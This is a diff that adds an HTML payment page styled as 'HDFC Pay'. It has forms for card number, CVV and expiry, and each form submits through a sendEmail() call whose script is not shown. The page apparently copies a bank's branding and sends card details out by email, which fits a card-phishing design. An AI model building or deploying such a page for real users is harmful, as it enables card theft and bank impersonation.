@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Payment page</title>
+    <link rel="stylesheet" href="payment.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.1/css/all.min.css" integrity="sha512-MV7K8+y+gLIBoVD59lQIYicR65iaqukzvf/nwasF0nqhPay5w/9lJmVM2hMDcnK1OnMGCdVK+iQrJ7lzPJQd1w==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+</head>
+<body>
+    <div class="container">
+        <div class="navbar">
+            <button><i class="fa-solid fa-chevron-left"></i></button>
+            <button><i class="fa-solid fa-xmark"></i></button>
+        </div>
+        <div class="logo">
+            <img src="./img/hdfc.png" alt="">
+            <h3><span>HDFC</span> Pay</h3>
+            <div class="time">
+                <button type="submit">0</button>
+                <button type="submit">9</button>
+                <h4>:</h4>
+                <button type="submit">5</button>
+                <button type="submit">0</button>
+            </div>
+        </div>
+        <div class="cards">
+            <form onsubmit="sendEmail(); reset(); return fasle;">
+                <label for="card Number">Card Number</label><br>
+                <p>Enter the 16-digit card number</p>
+                <input  name="card" id="" placeholder="" required> 
+            </form>
+        </div>
+        <div class="cvv">
+            <form onsubmit="sendEmail(); reset(); return fasle;">
+                <label for="CVV">CVV Number</label> <br>
+                <p>Enter the 3-digit cvv number</p>
+                <input type="password" name="password" id="password" placeholder="" required>
+            </form>
+        </div>
+        <div class="Expiry">
+            <form onsubmit="sendEmail(); reset(); return fasle;">
+                <label for="EXP">Expiry date</label> <br>
+                <p>Enter the Expiration date</p>
+                <input type="date" name="" id="" required>
+            </form>
+        </div> <br>
+        <div class="pay">
+            <h3>Pay Now</h3>
+        </div>
+    </div>
+    <div class="container2">
+        <table>
+            <tr>
+                <th>Company</th>
+                <td><i class="fa-brands fa-apple"></i>Apple</td>
+            </tr>
+            <tr>
+                <th>Order ID</th>
+                <td>2563124</td>
+            </tr>
+            <tr>
+                <th>product</th>
+                <td>Macbook Air</td>
+            </tr>
+            <tr>
+                <th>GST</th>
+                <td>8%</td>
+            </tr>
+        </table>
+        <p>---------------------------------</p>
+            <h6>You have to Pay</h6>
+        <div class="break">
+            <h5>₹84999/-</h5>
+            <i class="fa fa-light fa-receipt"></i>
+        </div>
+    </div>
+    <div class="container1">
+        
+        <div class="icons">
+            <i class="fa fa-thin fa-credit-card"></i>
+            <i class="fa-solid fa-wifi"></i>
+        </div> <br> <br> <br>
+        <p>Nandu Varma</p>
+        <p>....... 8484</p> <br>
+        <p>09/26</p>
+        <img src="./img/master card.png" alt="">
+    </div>
+
+    <script src="payment.js"></script>
+</body>
+</html>
